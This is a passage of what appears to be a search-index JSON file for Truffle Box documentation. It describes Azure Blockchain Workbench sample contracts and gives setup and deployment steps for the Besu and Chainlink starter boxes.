"boxes/azure-hello-blockchain/#application-files", "text": "HelloBlockchain.json HelloBlockchain.sol", "title": "Application Files"}, {"location": "boxes/azure-refrigerated-transportation/", "text": "Refrigerated Transportation Sample Application for Azure Blockchain Workbench \u00b6 Overview \u00b6 The refrigerated transportation smart contract covers a provenance scenario with IoT monitoring. You can think of it as a supply chain transport scenario where certain compliance rules must be met throughout the duration of the transportation process. The initiating counterparty specifies the humidity and temperature range the measurement must fall in to be compliant. At any point, if the device takes a temperature or humidity measurement that is out of range, the contract state will be updated to indicate that it is out of compliance. All participants can view the state and details of the contract at any point in time. The counterparty doing the transportation will specify the next counterparty responsible, and the device will ingest temperature and humidity data, which gets written to the chain. This allows the Supply Chain Owner and Supply Chain Observer to pinpoint which counterparty did not fulfill the compliance regulations if at any point in the process either the temperature or humidity requirements were not met. Application Roles \u00b6 Name Description InitiatingCounterParty The first participant in the supply chain. Counterparty A party to whom responsibility for a product has been assigned. For example, a shipper Device A device used to monitor the temperature and humidity of the environment the good(s) are being shipped in. Owner The organization that owns the product being transported. For example, a manufacturer Observer The individual or organization monitoring the supply chain. For example, a government agency States \u00b6 Name Description Created Indicates that the contract has initiated and tracking is in progress. InTransit Indicates that a Counterparty currently is in possession and responsible for goods being transported. Completed Indicates the product has reached it's intended destination. OutOfCompliance Indicates that the agreed upon terms for temperature and humidity conditions were not met. Workflow Details \u00b6 The following state transition diagram articulates the possible flows, and the various transition functions at each state. Each user is only allowed to take certain actions depending on the application role. Instance roles indicate that only the user with the application role assigned to the specific contract is able to take actions on the contract. This contract demonstrates how to collect telemetry information and enforce contract specifics related to conditions during transport. Specifically, receiving and evaluating temperature and humidity data against an agreed upon acceptable range. If the IoT device identifies that the telemetry is out of the acceptable range, the contract will shift into an\u202fout of compliance state and appropriate remedies can be sought. In the highlighted happy path, the device ingests readings, which are in compliance throughout the transportation process, while the involved counterparties transfer responsibility until the transportation is completed. Application Files \u00b6 RefrigeratedTransportation.json RefrigeratedTransportation.sol", "title": "Refrigerated Transportation Sample Application for Azure Blockchain Workbench"}, {"location": "boxes/azure-refrigerated-transportation/#refrigerated-transportation-sample-application-for-azure-blockchain-workbench", "text": "", "title": "Refrigerated Transportation Sample Application for Azure Blockchain Workbench"}, {"location": "boxes/azure-refrigerated-transportation/#overview", "text": "The refrigerated transportation smart contract covers a provenance scenario with IoT monitoring. You can think of it as a supply chain transport scenario where certain compliance rules must be met throughout the duration of the transportation process. The initiating counterparty specifies the humidity and temperature range the measurement must fall in to be compliant. At any point, if the device takes a temperature or humidity measurement that is out of range, the contract state will be updated to indicate that it is out of compliance. All participants can view the state and details of the contract at any point in time. The counterparty doing the transportation will specify the next counterparty responsible, and the device will ingest temperature and humidity data, which gets written to the chain. This allows the Supply Chain Owner and Supply Chain Observer to pinpoint which counterparty did not fulfill the compliance regulations if at any point in the process either the temperature or humidity requirements were not met.", "title": "Overview"}, {"location": "boxes/azure-refrigerated-transportation/#application-roles", "text": "Name Description InitiatingCounterParty The first participant in the supply chain. Counterparty A party to whom responsibility for a product has been assigned. For example, a shipper Device A device used to monitor the temperature and humidity of the environment the good(s) are being shipped in. Owner The organization that owns the product being transported. For example, a manufacturer Observer The individual or organization monitoring the supply chain. For example, a government agency", "title": "Application Roles"}, {"location": "boxes/azure-refrigerated-transportation/#states", "text": "Name Description Created Indicates that the contract has initiated and tracking is in progress. InTransit Indicates that a Counterparty currently is in possession and responsible for goods being transported. Completed Indicates the product has reached it's intended destination. OutOfCompliance Indicates that the agreed upon terms for temperature and humidity conditions were not met.", "title": "States"}, {"location": "boxes/azure-refrigerated-transportation/#workflow-details", "text": "The following state transition diagram articulates the possible flows, and the various transition functions at each state. Each user is only allowed to take certain actions depending on the application role. Instance roles indicate that only the user with the application role assigned to the specific contract is able to take actions on the contract. This contract demonstrates how to collect telemetry information and enforce contract specifics related to conditions during transport. Specifically, receiving and evaluating temperature and humidity data against an agreed upon acceptable range. If the IoT device identifies that the telemetry is out of the acceptable range, the contract will shift into an\u202fout of compliance state and appropriate remedies can be sought. In the highlighted happy path, the device ingests readings, which are in compliance throughout the transportation process, while the involved counterparties transfer responsibility until the transportation is completed.", "title": "Workflow Details"}, {"location": "boxes/azure-refrigerated-transportation/#application-files", "text": "RefrigeratedTransportation.json RefrigeratedTransportation.sol", "title": "Application Files"}, {"location": "boxes/azure-room-thermostat/", "text": "Room Thermostat Sample Application for Azure Blockchain Workbench \u00b6 Overview \u00b6 The room thermostat scenario expresses a workflow around thermostat installation and use. In this scenario, a person will install a thermostat and indicate who is the intended user for the thermostat. The assigned user can do things such as set the target temperature and set the mode for the thermostat. Application Roles \u00b6 Name Description Installer A person who is responsible for installing the thermostat. User A person who uses the thermostat. States \u00b6 Name Description Created Indicates that a thermostat installation has been requested. InUse Indicates that the thermostat is in use. Workflow Details \u00b6 The room thermostat is a simple workflow to demonstrate how to use the enum data type. Once the installer has installed and started the thermostat, the user can take two main actions. As a user, you can set the target temperature to a temperature you specify, or you can set the mode to one of four modes: Off, Cool, Heat, and Auto. Application Files \u00b6 RoomThermostat.sol", "title": "Room Thermostat Sample Application for Azure Blockchain Workbench"}, {"location": "boxes/azure-room-thermostat/#room-thermostat-sample-application-for-azure-blockchain-workbench", "text": "", "title": "Room Thermostat Sample Application for Azure Blockchain Workbench"}, {"location": "boxes/azure-room-thermostat/#overview", "text": "The room thermostat scenario expresses a workflow around thermostat installation and use. In this scenario, a person will install a thermostat and indicate who is the intended user for the thermostat. The assigned user can do things such as set the target temperature and set the mode for the thermostat.", "title": "Overview"}, {"location": "boxes/azure-room-thermostat/#application-roles", "text": "Name Description Installer A person who is responsible for installing the thermostat. User A person who uses the thermostat.", "title": "Application Roles"}, {"location": "boxes/azure-room-thermostat/#states", "text": "Name Description Created Indicates that a thermostat installation has been requested. InUse Indicates that the thermostat is in use.", "title": "States"}, {"location": "boxes/azure-room-thermostat/#workflow-details", "text": "The room thermostat is a simple workflow to demonstrate how to use the enum data type. Once the installer has installed and started the thermostat, the user can take two main actions. As a user, you can set the target temperature to a temperature you specify, or you can set the mode to one of four modes: Off, Cool, Heat, and Auto.", "title": "Workflow Details"}, {"location": "boxes/azure-room-thermostat/#application-files", "text": "RoomThermostat.sol", "title": "Application Files"}, {"location": "boxes/azure-simple-marketplace/", "text": "Simple Marketplace Sample Application for Azure Blockchain Workbench \u00b6 Overview \u00b6 The Simple Marketplace application expresses a workflow for a simple transaction between an owner and a buyer in a marketplace. The state transition diagram below shows the interactions among the states in this workflow. Application Roles \u00b6 Name Description Owner A person who wants to sell on the marketplace. Buyer A person who wants to buy from the marketplace. States \u00b6 Name Description ItemAvailable Indicates that an owner has made the item they want to sell available in the marketplace. OfferPlaced Indicates that a seller has made an offer to buy the item listed by an owner. Accepted Indicates that the owner has accepted the buyer's offer for the item. Workflow Details \u00b6 An instance of the Simple Marketplace application's workflow starts in the ItemAvailable state when an Owner makes an item available for sale by specifying its description and price. A buyer can then make an offer by specifying their price for the item. This action causes the state to change from ItemAvailable to OfferPlaced. Now, if the owner agrees to the buyer's offer, then owner calls the function to accept an offer, and the workflow reaches a successful conclusion state denoted by the Accepted state. If the owner, however, is not satisfied with the offer, then the owner can call the function to reject the offer. On rejection, the state changes to ItemAvailable indicating that the item is still up for sale. The transitions between the ItemAvailable and the OfferPlaced states can continue until the owner is satisfied with the offer made. A happy path shown in the transition diagram traces an owner making an item available, a buyer making an offer, and the owner accepting the offer. Application Files \u00b6 SimpleMarketplace.sol", "title": "Simple Marketplace Sample Application for Azure Blockchain Workbench"}, {"location": "boxes/azure-simple-marketplace/#simple-marketplace-sample-application-for-azure-blockchain-workbench", "text": "", "title": "Simple Marketplace Sample Application for Azure Blockchain Workbench"}, {"location": "boxes/azure-simple-marketplace/#overview", "text": "The Simple Marketplace application expresses a workflow for a simple transaction between an owner and a buyer in a marketplace. The state transition diagram below shows the interactions among the states in this workflow.", "title": "Overview"}, {"location": "boxes/azure-simple-marketplace/#application-roles", "text": "Name Description Owner A person who wants to sell on the marketplace. Buyer A person who wants to buy from the marketplace.", "title": "Application Roles"}, {"location": "boxes/azure-simple-marketplace/#states", "text": "Name Description ItemAvailable Indicates that an owner has made the item they want to sell available in the marketplace. OfferPlaced Indicates that a seller has made an offer to buy the item listed by an owner. Accepted Indicates that the owner has accepted the buyer's offer for the item.", "title": "States"}, {"location": "boxes/azure-simple-marketplace/#workflow-details", "text": "An instance of the Simple Marketplace application's workflow starts in the ItemAvailable state when an Owner makes an item available for sale by specifying its description and price. A buyer can then make an offer by specifying their price for the item. This action causes the state to change from ItemAvailable to OfferPlaced. Now, if the owner agrees to the buyer's offer, then owner calls the function to accept an offer, and the workflow reaches a successful conclusion state denoted by the Accepted state. If the owner, however, is not satisfied with the offer, then the owner can call the function to reject the offer. On rejection, the state changes to ItemAvailable indicating that the item is still up for sale. The transitions between the ItemAvailable and the OfferPlaced states can continue until the owner is satisfied with the offer made. A happy path shown in the transition diagram traces an owner making an item available, a buyer making an offer, and the owner accepting the offer.", "title": "Workflow Details"}, {"location": "boxes/azure-simple-marketplace/#application-files", "text": "SimpleMarketplace.sol", "title": "Application Files"}, {"location": "boxes/bazaar-item-listing/", "text": "Bazaar - Item Listing Sample Application for Azure Blockchain Workbench \u00b6 Overview \u00b6 The Bazaar - Item Listing scenario shows an example of how an application can have more than one workflow and how one contract can deploy another contract. The Bazaar - Item Listing application has two workflows. The first workflow binds two people through a smart contract. The second workflow lets the two people bound by a smart contract list items that can be bought and sold between themselves. The result of buying and selling an item, such as updating user balances, from the second workflow is reflected in the first workflow. Application Roles \u00b6 Name Description BazaarMaintainer A person who is responsible for pairing or binding two people through a smart contract. Party A person who is participant in the application. A person in a party role can be a part of one or more bindings, in that can be paired with more than one parties through multiple smart contracts (one smart contract for each pair). Bazaar Workflow States \u00b6 Name Description PartyProvisioned Indicates that two persons in Party roles have been provisioned along with their monetary balance values. ItemListed Indicates that a party has listed an item in the bazaar. CurrentSaleFinalized Indicates that the sale of an item currently listed has been completed. Item Listing Workflow States \u00b6 Name Description ItemAvailable Indicates that an item is available for buying. ItemSold Indicates that the item that was available for buying is now sold. Workflow Details \u00b6 An instance of the Bazaar - Item Listing application first creates a binding between two users (here Party A and Party B). The two users are bound by a smart contract that tracks their balances (here Party A Balance and Party B Balance). Once the smart contract is created and deployed on the chain, the instance reaches the Party Provisioned state. Party A and Party B, bound by the smart contract, can now begin to buy and sell items between themselves. A party can list the item by calling the transition function List Item in Workflow 1. The List Item function takes in the item name and the item price and calls Workflow 2's constructor with the correct set of arguments. A successful completion of List Item creates an instance of the second workflow and places that workflow instance in the Item Available state. An item that is available can be bought using the Buy Item function. The Buy Item function checks if the buyer has sufficient balance and proceeds to buy the item by way of updating the parties' balances. Now, since the parent contract's address is known, a direct call can be made to the parent contract's Update Balance function. The Update Balance function appropriately updates the balance of the two parties. A successful execution puts the second workflow instance in the Item Sold state and the first workflow instance in the Current Sale Finalized state. The List Item function is always available to create new items and consequently new instances of the second workflow. The List Item function is available to both parties so that either party can list an item for sale. Please note that the first workflow does not have a final state indicating that the two parties can continue to buy and sell more than one item in the Bazaar. The second workflow, however, does have a final state indicating that an instance of the second workflow captures the sale of exactly one item between the two parties. Application Files \u00b6 BazaarItemListing.json : This is the meta-data file and contains information on the two workflows, their properties, functions, and state transition rules. BazaarItemListing.zip: This file contains three solidity files. * BazaarItemListing.sol - This file contains the code for Workflow 1 in the diagram, binding two users in a contract. * ItemListing.sol - This file contains the code for Workflow 2 in the diagram, buying and selling an item. * WorkbenchBase.sol - This file contains the Workbench base class and the event definitions.", "title": "Bazaar - Item Listing Sample Application for Azure Blockchain Workbench"}, {"location": "boxes/bazaar-item-listing/#bazaar-item-listing-sample-application-for-azure-blockchain-workbench", "text": "", "title": "Bazaar - Item Listing Sample Application for Azure Blockchain Workbench"}, {"location": "boxes/bazaar-item-listing/#overview", "text": "The Bazaar - Item Listing scenario shows an example of how an application can have more than one workflow and how one contract can deploy another contract. The Bazaar - Item Listing application has two workflows. The first workflow binds two people through a smart contract. The second workflow lets the two people bound by a smart contract list items that can be bought and sold between themselves. The result of buying and selling an item, such as updating user balances, from the second workflow is reflected in the first workflow.", "title": "Overview"}, {"location": "boxes/bazaar-item-listing/#application-roles", "text": "Name Description BazaarMaintainer A person who is responsible for pairing or binding two people through a smart contract. Party A person who is participant in the application. A person in a party role can be a part of one or more bindings, in that can be paired with more than one parties through multiple smart contracts (one smart contract for each pair).", "title": "Application Roles"}, {"location": "boxes/bazaar-item-listing/#bazaar-workflow-states", "text": "Name Description PartyProvisioned Indicates that two persons in Party roles have been provisioned along with their monetary balance values. ItemListed Indicates that a party has listed an item in the bazaar. CurrentSaleFinalized Indicates that the sale of an item currently listed has been completed.", "title": "Bazaar Workflow States"}, {"location": "boxes/bazaar-item-listing/#item-listing-workflow-states", "text": "Name Description ItemAvailable Indicates that an item is available for buying. ItemSold Indicates that the item that was available for buying is now sold.", "title": "Item Listing Workflow States"}, {"location": "boxes/bazaar-item-listing/#workflow-details", "text": "An instance of the Bazaar - Item Listing application first creates a binding between two users (here Party A and Party B). The two users are bound by a smart contract that tracks their balances (here Party A Balance and Party B Balance). Once the smart contract is created and deployed on the chain, the instance reaches the Party Provisioned state. Party A and Party B, bound by the smart contract, can now begin to buy and sell items between themselves. A party can list the item by calling the transition function List Item in Workflow 1. The List Item function takes in the item name and the item price and calls Workflow 2's constructor with the correct set of arguments. A successful completion of List Item creates an instance of the second workflow and places that workflow instance in the Item Available state. An item that is available can be bought using the Buy Item function. The Buy Item function checks if the buyer has sufficient balance and proceeds to buy the item by way of updating the parties' balances. Now, since the parent contract's address is known, a direct call can be made to the parent contract's Update Balance function. The Update Balance function appropriately updates the balance of the two parties. A successful execution puts the second workflow instance in the Item Sold state and the first workflow instance in the Current Sale Finalized state. The List Item function is always available to create new items and consequently new instances of the second workflow. The List Item function is available to both parties so that either party can list an item for sale. Please note that the first workflow does not have a final state indicating that the two parties can continue to buy and sell more than one item in the Bazaar. The second workflow, however, does have a final state indicating that an instance of the second workflow captures the sale of exactly one item between the two parties.", "title": "Workflow Details"}, {"location": "boxes/bazaar-item-listing/#application-files", "text": "BazaarItemListing.json : This is the meta-data file and contains information on the two workflows, their properties, functions, and state transition rules. BazaarItemListing.zip: This file contains three solidity files. * BazaarItemListing.sol - This file contains the code for Workflow 1 in the diagram, binding two users in a contract. * ItemListing.sol - This file contains the code for Workflow 2 in the diagram, buying and selling an item. * WorkbenchBase.sol - This file contains the Workbench base class and the event definitions.", "title": "Application Files"}, {"location": "boxes/besu-box/", "text": "Besu-Box \u00b6 To Be Used as Truffle Box Creating API Endpoints for Hyperledger Besu network. We use a private blockchain for Ethereum BlockChain Development. This personalised blockchain is made with HL Besu Client. The Smart Contract Written in solidity language is deployed on this Ethereum Permissioned Blockchain. Smart Contract is Immutable hence, once deployed it can't be changed. A truffle box to serve as the foundation of any Truffle and Express.js dApp. This Box Uses NodeJS(Express JS) to provide API endpoints to the Ethereum Blockchain smart contract so that this smart contract can be used in Android/iOS Apps as well. Pre-Requisites 1. NodeJS 2. NestJS 3. Docker 4. Truffle 5. Besu Docker Image 6. Curl Installation 1. Install Truffle and Nestjs globally npm install -g truffle npm install -g @nestjs/cli Download the box. This also takes care of installing the necessary dependencies. truffle unbox illuzzig/besu-box For quick, temporary tests this guide uses /tmp/besu/dev/ as mount volumes. Make sure you create the folders first in the root dir mkdir -p /tmp/besu/dev/ To run a node that mines blocks at a rate suitable for testing purposes // in another terminal (i.e. not in the truffle develop prompt) // ensure you are inside the app directory when running this npm run besu : docker Now you can deploy your smart contracts. // in another terminal (i.e. not in the truffle develop prompt) // ensure you are inside the app directory when running this truffle migrate -- network besu To run the Nestjs server // in another terminal (i.e. not in the truffle develop prompt) // ensure you are inside the app directory when running this npm run start : dev In a window terminal type // in another terminal (i.e. not in the truffle develop prompt) // ensure you are inside the app directory when running this curl http://localhost:3000/balance/0xFE3B557E8Fb62b89F4916B721be55cEb828dBd73 As you can see this address holds all the metaCoin tokens accordin to the business logic implemented into the smart contract. Below the response {\"address\":\"0xFE3B557E8Fb62b89F4916B721be55cEb828dBd73\",\"balance\":\"10000\"} Set the variable metaCoinAddress (client_script/utils.js) to match the deployed MetaCoin address from truffle migrate . You can get the smart contract address by typing // in another terminal (i.e. not in the truffle develop prompt) // ensure you are inside the app directory when running this truffle networks | grep -i metacoin Launch the transfer script // in another terminal (i.e. not in the truffle develop prompt) // ensure you are inside the app directory when running this npm run transfer The second address will receive 10 tokens from the first one. In a window terminal type // in another terminal (i.e. not in the truffle develop prompt) // ensure you are inside the app directory when running this curl http://localhost:3000/balance/0x627306090abaB3A6e1400e9345bC60c78a8BEf57 Below the response {\"address\":\"0x627306090abaB3A6e1400e9345bC60c78a8BEf57\",\"balance\":\"10\"} For web service monitoring and performance metrics you can enable the APM agent in the main.ts file and visualize the incoming requests with kibana. Read More Contributors 1. Giuseppe Gaetano Illuzzi", "title": "Besu-Box"}, {"location": "boxes/besu-box/#besu-box", "text": "To Be Used as Truffle Box Creating API Endpoints for Hyperledger Besu network. We use a private blockchain for Ethereum BlockChain Development. This personalised blockchain is made with HL Besu Client. The Smart Contract Written in solidity language is deployed on this Ethereum Permissioned Blockchain. Smart Contract is Immutable hence, once deployed it can't be changed. A truffle box to serve as the foundation of any Truffle and Express.js dApp. This Box Uses NodeJS(Express JS) to provide API endpoints to the Ethereum Blockchain smart contract so that this smart contract can be used in Android/iOS Apps as well. Pre-Requisites 1. NodeJS 2. NestJS 3. Docker 4. Truffle 5. Besu Docker Image 6. Curl Installation 1. Install Truffle and Nestjs globally npm install -g truffle npm install -g @nestjs/cli Download the box. This also takes care of installing the necessary dependencies. truffle unbox illuzzig/besu-box For quick, temporary tests this guide uses /tmp/besu/dev/ as mount volumes. Make sure you create the folders first in the root dir mkdir -p /tmp/besu/dev/ To run a node that mines blocks at a rate suitable for testing purposes // in another terminal (i.e. not in the truffle develop prompt) // ensure you are inside the app directory when running this npm run besu : docker Now you can deploy your smart contracts. // in another terminal (i.e. not in the truffle develop prompt) // ensure you are inside the app directory when running this truffle migrate -- network besu To run the Nestjs server // in another terminal (i.e. not in the truffle develop prompt) // ensure you are inside the app directory when running this npm run start : dev In a window terminal type // in another terminal (i.e. not in the truffle develop prompt) // ensure you are inside the app directory when running this curl http://localhost:3000/balance/0xFE3B557E8Fb62b89F4916B721be55cEb828dBd73 As you can see this address holds all the metaCoin tokens accordin to the business logic implemented into the smart contract. Below the response {\"address\":\"0xFE3B557E8Fb62b89F4916B721be55cEb828dBd73\",\"balance\":\"10000\"} Set the variable metaCoinAddress (client_script/utils.js) to match the deployed MetaCoin address from truffle migrate . You can get the smart contract address by typing // in another terminal (i.e. not in the truffle develop prompt) // ensure you are inside the app directory when running this truffle networks | grep -i metacoin Launch the transfer script // in another terminal (i.e. not in the truffle develop prompt) // ensure you are inside the app directory when running this npm run transfer The second address will receive 10 tokens from the first one. In a window terminal type // in another terminal (i.e. not in the truffle develop prompt) // ensure you are inside the app directory when running this curl http://localhost:3000/balance/0x627306090abaB3A6e1400e9345bC60c78a8BEf57 Below the response {\"address\":\"0x627306090abaB3A6e1400e9345bC60c78a8BEf57\",\"balance\":\"10\"} For web service monitoring and performance metrics you can enable the APM agent in the main.ts file and visualize the incoming requests with kibana. Read More Contributors 1. Giuseppe Gaetano Illuzzi", "title": "Besu-Box"}, {"location": "boxes/blueprint/", "text": "Blueprint Truffle Box \u00b6 This box comes with everything you need to create your own Truffle Box. Getting Started \u00b6 After adding your libraries and code: Delete box-img-sm.png and box-img-lg.png . Use box-img-sm-template.png and box-img-lg-template.png to create your own art. Delete the template images and replace them with your art. Be sure your art's filenames don't have -template in them. Customize the box configuration file ( truffle-box.json ) if necessary. See the Truffle Box section of our documentation for more info.", "title": "Blueprint Truffle Box"}, {"location": "boxes/blueprint/#blueprint-truffle-box", "text": "This box comes with everything you need to create your own Truffle Box.", "title": "Blueprint Truffle Box"}, {"location": "boxes/blueprint/#getting-started", "text": "After adding your libraries and code: Delete box-img-sm.png and box-img-lg.png . Use box-img-sm-template.png and box-img-lg-template.png to create your own art. Delete the template images and replace them with your art. Be sure your art's filenames don't have -template in them. Customize the box configuration file ( truffle-box.json ) if necessary. See the Truffle Box section of our documentation for more info.", "title": "Getting Started"}, {"location": "boxes/chainlink-box/", "text": "Chainlink Truffle Starter Kit Getting Started It's recommended that you've gone through the Truffle getting started documentation before proceeding here. Requirements Quickstart Usage Deploying Contracts Run a Local Network Using a Testnet or Live Network (like Mainnet or Polygon) Sepolia Ethereum Testnet Setup Test Interacting with Deployed Contracts Chainlink Price Feeds Request & Receive Data VRF Get a random number Keepers Verify on Etherscan Contributing Thank You! Resources Chainlink Truffle Starter Kit \u00b6 Implementation of the following 4 Chainlink features using the Truffle development environment: - Chainlink Price Feeds - Chainlink VRF - Chainlink Keepers - Request & Receive data Getting Started \u00b6 It's recommended that you've gone through the Truffle getting started documentation before proceeding here. \u00b6 Requirements \u00b6 git You'll know you did it right if you can run git --version and you see a response like git version x.x.x Nodejs You'll know you've installed nodejs right if you can run: node --version and get an ouput like: vx.x.x Yarn instead of npm You'll know you've installed yarn right if you can run: yarn --version And get an output like: x.x.x You might need to install it with npm If you're familiar with npx and npm instead of yarn , you can use npx for execution and npm for installing dependencies. Quickstart \u00b6 Clone and install dependencies After installing all the requirements, run the following: git clone https://github.com/smartcontractkit/truffle-starter-kit/ cd truffle-starter-kit Then: yarn or npm i You can now do stuff! Run truffle test This will run your JavaScript, TypeScript, and Solidity tests underneath the ./test folder. If the development network is not specified in your truffle-config , truffle test will automatically bring up and tear down a local network on localhost:8545 . Usage \u00b6 If you run truffle --help you'll get an output of all the tasks you can run. Deploying Contracts \u00b6 In your truffle-config.js you'll see section like: networks: { This section of the file is where you define which networks you want to interact with. You can read more about that whole file in the Truffle documentation. . To deploy a contract, you would call: truffle migrate --network <NETWORK> This will deploy your contracts to the network you specify. If you do not specify network , by default truffle migrate will deploy to the development network if it is defined in your truffle-config . If you'd like to interact with your deployed contracts, skip down to Interacting with Deployed Contracts . Run a Local Network \u00b6 One of the best ways to test and interact with smart contracts is with a local network. To start a local network with all your contracts in it, run the following: ganache -d This will start ganache , a local blockchain with private keys, pre-funded wallets, and an endpoint to potentially add to an EVM wallet. -d specifies a deterministic wallet. You can see all other ways you can configure Ganache here . In our truffle-config , we've defined the local ganache network. To migrate, simply call: truffle migrate --network ganache Using a Testnet or Live Network (like Mainnet or Polygon) \u00b6 To interact with a live or test network, you will need ETH and LINK token by following these steps: Get some Sepolia Testnet ETH and LINK Head over to the Chainlink faucets and get some ETH and LINK. Please follow the chainlink documentation if unfamiliar. Create VRF V2 subscription Head over to VRF Subscription Page and create the new subscription. Save your subscription ID and place it in your helper-truffle-config.js under subId . Truffle Dashboard \u00b6 This is our recommended way of deploying your contracts. With Truffle dashboard , you can deploy contracts and sign transactions through MetaMask - so you never exposing your private key! To do so, run: truffle dashboard This should bring up the dashboard on localhost:24012 , where you can connect your wallet to the network of your choice. Note that if you want to deploy to a testnet or mainnet, you'll need ETH to pay the gas fees. Then, if you want to migrate your contracts, simply call: truffle migrate --network dashboard You should then see prompts to sign the transactions on the dashboard view. Check out this video on how to use it with Truffle and HardHat here . Environment configuration \u00b6 In some cases, you might want your transactions to be automatically signed. In which case, you will need to provide your wallet's private key An RPC URL A private key ETH & LINK token (either testnet or real) Let's look at an example of setting these up using the Sepolia testnet. Sepolia Ethereum Testnet Setup \u00b6 First, we will need to set environment variables. We can do so by setting them in our .env file (create it if it's not there). You can also read more about environment variables from the linked twilio blog. You'll find a sample of what this file will look like in .env.example IMPORTANT: MAKE SURE YOU'D DONT EXPOSE THE KEYS YOU PUT IN THIS .env FILE. By that, I mean don't push them to a public repo, and please try to keep them keys you use in development not associated with any real funds. Set your SEPOLIA_RPC_URL environment variable. You can get one for free from Infura , Alchemy , or Moralis . This is your connection to the blockchain. Set your PRIVATE_KEY environment variable. This is your private key from your wallet, ie MetaMask . This is needed for deploying contracts to public networks. WARNING When developing, it's best practice to use a Metamask that isn't associated with any real money. A good way to do this is to use Truffle Dashboard. Alternatively, make a new browser profile (on Chrome, Brave, Firefox, etc) and install Metamask on that brower, and never send this wallet money. Don't commit and push any changes to .env files that may contain sensitive information, such as a private key! If this information reaches a public GitHub repository, someone can use it to check if you have any Mainnet funds in that wallet address, and steal them! .env example: SEPOLIA_RPC_URL='https://sepolia.infura.io/v3/asdfasdfasdfasdf' PRIVATE_KEY='abcdef' bash example export SEPOLIA_RPC_URL='https://sepolia.infura.io/v3/asdfasdfasdfasdf' export PRIVATE_KEY='abcdef' For other networks like mainnet and polygon, you can use different environment variables for your RPC URL and your private key. See the truffle-config.js to learn more. Uncomment the sepolia network in your truffle-config . You should now be all setup! You can run any command and just pass the --network sepolia now! To deploy all contracts: truffle migrate --network sepolia Test \u00b6 Tests are located in the test directory, and are split between unit tests and staging/testnet tests. Unit tests should only be run on local environments, and staging tests should only run on live environments. To run unit tests: truffle test Interacting with Deployed Contracts \u00b6 After deploying your contracts, the deployment output will give you the contract addresses as they are deployed. You can then use these contract addresses in conjunction with Truffle scripts to perform operations on each contract. Alternatively, if you want to interact with contracts on the fly, you can read about how to use truffle console or truffle develop here . Chainlink Price Feeds \u00b6 The Price Feeds consumer contract has one script, to read the latest price of a specified price feed contract. You can deploy just the price feed consumer with: truffle migrate --f 3 --to 3 --network <NETWORK> After deployment, run the following: truffle exec scripts/readPriceConsumer.js --network <NETWORK> Request & Receive Data \u00b6 The API Consumer contract has one script, to request data from the API and wait for a response. You can deploy just the API Consumer with: truffle migrate --f 4 --to 4 --network <NETWORK> After deployment, run the following: yarn truffle exec scripts/requestAndReadAPI.js --network <NETWORK> VRF Get a random number \u00b6 The VRF Consumer contract has one script, to request a random number and wait for a response. You can deploy just the VRF Consumer with: truffle deploy --f 5 --to 5 --network <NETWORK> After deployment, you'll need to add your contract address to your subscription. Head over to vrf.chain.link and add your consumer. Then, run the following: truffle exec scripts/requestAndReadRandomNumber.js --network <NETWORK> Keepers \u00b6 The Keepers Consumer contract has one script, to check the upkeep. After deployment, run the following: truffle exec scripts/checkUpkeep.js --network <NETWORK> To see everything in action, you'll want to set up a consumer at keepers.chain.link . Verify on Etherscan \u00b6 You'll need an ETHERSCAN_API_KEY environment variable. You can get one from the Etherscan API site. . If you have it set, your deploy script will try to verify them by default, but if you want to verify any manually, you can run: truffle run verify <CONTRACT> --network <NETWORK> example: truffle run verify PriceConsumerV3 --network sepolia Contributing \u00b6 Contributions are always welcome! Open a PR or an issue! Thank You! \u00b6 Resources \u00b6 Chainlink Documentation Truffle Documentation", "title": "Index"}, {"location": "boxes/chainlink-box/#chainlink-truffle-starter-kit", "text": "Implementation of the following 4 Chainlink features using the Truffle development environment: - Chainlink Price Feeds - Chainlink VRF - Chainlink Keepers - Request & Receive data", "title": "Chainlink Truffle Starter Kit"}, {"location": "boxes/chainlink-box/#getting-started", "text": "", "title": "Getting Started"}, {"location": "boxes/chainlink-box/#its-recommended-that-youve-gone-through-the-truffle-getting-started-documentation-before-proceeding-here", "text": "", "title": "It's recommended that you've gone through the Truffle getting started documentation before proceeding here."}, {"location": "boxes/chainlink-box/#requirements", "text": "git You'll know you did it right if you can run git --version and you see a response like git version x.x.x Nodejs You'll know you've installed nodejs right if you can run: node --version and get an ouput like: vx.x.x Yarn instead of npm You'll know you've installed yarn right if you can run: yarn --version And get an output like: x.x.x You might need to install it with npm If you're familiar with npx and npm instead of yarn , you can use npx for execution and npm for installing dependencies.", "title": "Requirements"}, {"location": "boxes/chainlink-box/#quickstart", "text": "Clone and install dependencies After installing all the requirements, run the following: git clone https://github.com/smartcontractkit/truffle-starter-kit/ cd truffle-starter-kit Then: yarn or npm i You can now do stuff! Run truffle test This will run your JavaScript, TypeScript, and Solidity tests underneath the ./test folder. If the development network is not specified in your truffle-config , truffle test will automatically bring up and tear down a local network on localhost:8545 .", "title": "Quickstart"}, {"location": "boxes/chainlink-box/#usage", "text": "If you run truffle --help you'll get an output of all the tasks you can run.", "title": "Usage"}, {"location": "boxes/chainlink-box/#deploying-contracts", "text": "In your truffle-config.js you'll see section like: networks: { This section of the file is where you define which networks you want to interact with. You can read more about that whole file in the Truffle documentation. . To deploy a contract, you would call: truffle migrate --network <NETWORK> This will deploy your contracts to the network you specify. If you do not specify network , by default truffle migrate will deploy to the development network if it is defined in your truffle-config . If you'd like to interact with your deployed contracts, skip down to Interacting with Deployed Contracts .", "title": "Deploying Contracts"}, {"location": "boxes/chainlink-box/#run-a-local-network", "text": "One of the best ways to test and interact with smart contracts is with a local network. To start a local network with all your contracts in it, run the following: ganache -d This will start ganache , a local blockchain with private keys, pre-funded wallets, and an endpoint to potentially add to an EVM wallet. -d specifies a deterministic wallet. You can see all other ways you can configure Ganache here . In our truffle-config , we've defined the local ganache network. To migrate, simply call: truffle migrate --network ganache", "title": "Run a Local Network"}, {"location": "boxes/chainlink-box/#using-a-testnet-or-live-network-like-mainnet-or-polygon", "text": "To interact with a live or test network, you will need ETH and LINK token by following these steps: Get some Sepolia Testnet ETH and LINK Head over to the Chainlink faucets and get some ETH and LINK. Please follow the chainlink documentation if unfamiliar. Create VRF V2 subscription Head over to VRF Subscription Page and create the new subscription. Save your subscription ID and place it in your helper-truffle-config.js under subId .", "title": "Using a Testnet or Live Network (like Mainnet or Polygon)"}, {"location": "boxes/chainlink-box/#truffle-dashboard", "text": "This is our recommended way of deploying your contracts. With Truffle dashboard , you can deploy contracts and sign transactions through MetaMask - so you never exposing your private key! To do so, run: truffle dashboard This should bring up the dashboard on localhost:24012 , where you can connect your wallet to the network of your choice. Note that if you want to deploy to a testnet or mainnet, you'll need ETH to 